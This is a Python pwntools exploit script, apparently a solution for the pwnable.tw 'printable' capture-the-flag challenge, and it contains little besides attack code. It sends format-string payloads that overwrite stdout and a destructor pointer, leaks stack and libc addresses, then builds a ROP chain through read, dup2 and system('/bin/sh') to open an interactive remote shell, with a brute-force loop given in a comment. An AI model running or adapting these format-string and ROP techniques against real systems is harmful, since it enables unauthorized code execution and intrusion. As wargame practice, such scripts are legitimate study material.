#!/usr/bin/env python

'''
Use this script 
#!/bin/sh
round=-1
for i in $(seq 1 20000)
do
   echo "Welcome to Hell: $i times"
   ./printable.py -$round
done
'''



from pwn import *
#context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
cn = remote('chall.pwnable.tw',10307)
#cn = process('./printable', env={'LD_PRELOAD':'./libc_64.so.6'})

# Wait for debugger
#pid = util.proc.pidof(cn)[0]
#print "The pid is: "+str(pid)
#util.proc.wait_for_debugger(pid)

stdout		=  0x00601020  
bss 		=  0x00601050

payload1 = ''
payload1 += "%37x%16$hhn" +"AAAAAAA" 	# forcing stdout = stderr 
payload1 += "%20x%17$hhn" 

payload1 += "%229x%18$hhn" 
payload1 += "%228x%19$hhn" 
payload1 += "%55x%20$hhn" + "AAAAAA"

payload1 += "%82x%42$hn"   			#  _dl_fini.c destructor points to main+x
payload1 += p64(stdout+1)+p64(stdout)
payload1 += p64(bss)+p64(bss+1)+p64(bss+2)

payload2 =  "%37x%23$hhn"			# return modification to point 0x400925
payload2 += "stack:%23$lx\n"			# stack leak
payload2 += "libc:%28$lx\n"			# libc leak

#bp in libc: 0x4cf49, 0x4c0e7			# printf %hn %hhn
#bp on ld: 0x10dc9				# dl_fini.c

try:
    cn.sendafter("Input :",payload1)
    time.sleep(0.5)
except:
    cn.close()

#Fase 2
cn.send(payload2)

cn.recvuntil("stack:")
stack=int(cn.recvn(12), 16)
cn.recvuntil("libc:")
libc =int(cn.recvn(12), 16)-0x3c4c40


print "libc  address:" + hex(libc)
print "stack address:" + hex(stack)


#Fase3
time.sleep(0.5)
addrsp	=	libc+0x13626f		# rop chain list
system 	=	libc+0x45390
binsh	=	libc+0x18c177
poprdi	=	0x4009c3
poprsi	=	libc+0x203e6
poprdx	=	libc+0x1b96
read	=	0x400710
dup2	= 	libc+0xf6d90

one_gadget0=addrsp & 0xffff
one_gadget1=addrsp>>16 & 0xffff
one_gadget2=addrsp>>32 & 0xffff
alist=[(one_gadget0,0),(one_gadget1,1),(one_gadget2,2)]

def sortFirst(val): 
    return val[0]  
    
alist.sort(key = sortFirst) 


payload3=""
counter=0
for i in range(3):
    if i > 0:
        counter = alist[i][0]-alist[i-1][0]
    else:
        counter = alist[i][0]
            
    payload3 += "%" + str(counter) + "x%" + str(18+alist[i][1]) +"$hn"


payload3 = payload3.ljust(8*5,'A')
payload3 += p64(stack)
payload3 += p64(stack+2)
payload3 += p64(stack+4)
payload3 += p64(poprdi)			# rop chain for writing stack from read start here
payload3 += p64(0)
payload3 += p64(poprsi)
payload3 += p64(stack+0xB8)
payload3 += p64(poprdx)
payload3 += p64(0x200)
payload3 += p64(read)			# read(0,stackpointer,0x200)   Bum!!
cn.send(payload3)

payload4 =  p64(poprdi)			# dup2(2,1) 
payload4 += p64(0x02)
payload4 += p64(poprsi)
payload4 += p64(0x01)
payload4 += p64(dup2)
payload4 += p64(poprdi)			# system("/bin/sh")
payload4 += p64(binsh)
payload4 += p64(system)

#Fase final
time.sleep(0.5)
cn.send(payload4)
cn.interactive()

